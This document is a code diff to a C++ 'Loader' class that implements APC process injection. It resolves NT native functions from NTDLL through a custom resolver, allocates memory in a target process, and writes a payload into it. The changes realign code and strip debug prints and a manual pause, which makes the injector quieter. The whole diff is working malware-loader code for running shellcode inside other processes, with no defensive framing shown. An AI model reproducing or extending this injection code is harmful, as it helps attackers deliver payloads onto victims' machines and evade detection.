@@ -17,10 +17,10 @@ BOOL Loader::InitSyscallStruct(OUT PSyscall st) {
 	HMODULE hNtdll = resolver.GetModHandle(L"NTDLL.DLL");
 	if (!hNtdll) return FALSE;
 
-	st->pNtAllocateVirtualMemory =	(fnNtAllocateVirtualMemory)resolver.GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-	st->pNtProtectVirtualMemory =	(fnNtProtectVirtualMemory)resolver.GetProcAddress(hNtdll, "NtProtectVirtualMemory");
-	st->pNtWriteVirtualMemory =		(fnNtWriteVirtualMemory)resolver.GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-	st->pNtQueueApcThread =			(fnNtQueueApcThread)resolver.GetProcAddress(hNtdll, "NtQueueApcThread");
+	st->pNtAllocateVirtualMemory	= (fnNtAllocateVirtualMemory)resolver.GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+	st->pNtProtectVirtualMemory		= (fnNtProtectVirtualMemory)resolver.GetProcAddress(hNtdll, "NtProtectVirtualMemory");
+	st->pNtWriteVirtualMemory		= (fnNtWriteVirtualMemory)resolver.GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+	st->pNtQueueApcThread			= (fnNtQueueApcThread)resolver.GetProcAddress(hNtdll, "NtQueueApcThread");
 
 	if (st->pNtAllocateVirtualMemory	== NULL ||
 		st->pNtProtectVirtualMemory		== NULL ||
@@ -35,24 +35,14 @@ BOOL Loader::InitSyscallStruct(OUT PSyscall st) {
 }
 
 BOOL Loader::ApcInjection(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
-	printf("[i] SIZE OF PAYLOAD AT START OF INJECTION 0: %zu\n", sPayloadSize);
 	sSize = sPayloadSize;
 	
 	// Allocate memory
 	if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
 		return FALSE;
 	}
-	printf("[+] Allocation of size: %zu\n", sSize);
 
-	// write payload
-	printf("[#] Press <Enter> To Write The Payload ...\n");
-	getchar();
-
-	printf("[i] SIZE OF PAYLOAD AT START OF INJECTION 1: %zu\n", sPayloadSize);
-	printf("\t[i] Writing Payload of Size %zu ...\n", sPayloadSize);
 	if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, (PULONG)&sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
-		printf("[!] pNtWriteVirtualMemory Failed with Error : 0x%0.08X \n", STATUS);
-		printf("[i] Bytes Written : %zu of %zu\n", sNumberOfBytesWritten, sPayloadSize);
 		return FALSE;
 	}
 
